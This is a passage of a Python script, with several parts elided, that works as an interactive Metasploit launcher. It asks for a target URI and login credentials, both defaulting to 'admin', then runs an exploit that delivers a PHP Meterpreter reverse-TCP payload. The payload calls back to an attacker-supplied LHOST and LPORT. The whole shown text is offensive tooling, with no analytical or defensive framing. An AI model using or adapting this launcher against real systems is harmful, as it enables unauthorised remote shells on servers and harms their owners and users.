...
async def main():
    ...
    default_val = "/"
    user_input = console.input(
        f"[bold]➤ Enter value for TARGETURI [default: {default_val}]: [/]"
    ) or default_val
    ...
    default_val = "admin"
    user_input = console.input(
        f"[bold]➤ Enter value for USERNAME [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and True:
        raise ValueError("Missing required parameter: USERNAME")
    user_params["USERNAME"] = user_input
    ...
    default_val = "admin"
    user_input = console.input(
        f"[bold]➤ Enter value for PASSWORD [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and True:
        raise ValueError("Missing required parameter: PASSWORD")
    user_params["PASSWORD"] = user_input
    ...
    with console.status("[bold green]Configuring Metasploit payload..."):
        ...
        metasploit_executor.exploit_and_execute_payload(
            ...
            payload_module_name="php/meterpreter/reverse_tcp_uuid",
            RHOSTS=user_params["RHOSTS"], RPORT=user_params["RPORT"], TARGETURI=user_params["TARGETURI"], USERNAME=user_params["USERNAME"], PASSWORD=user_params["PASSWORD"], LHOST=user_params["LHOST"], LPORT=user_params["LPORT"]
    )
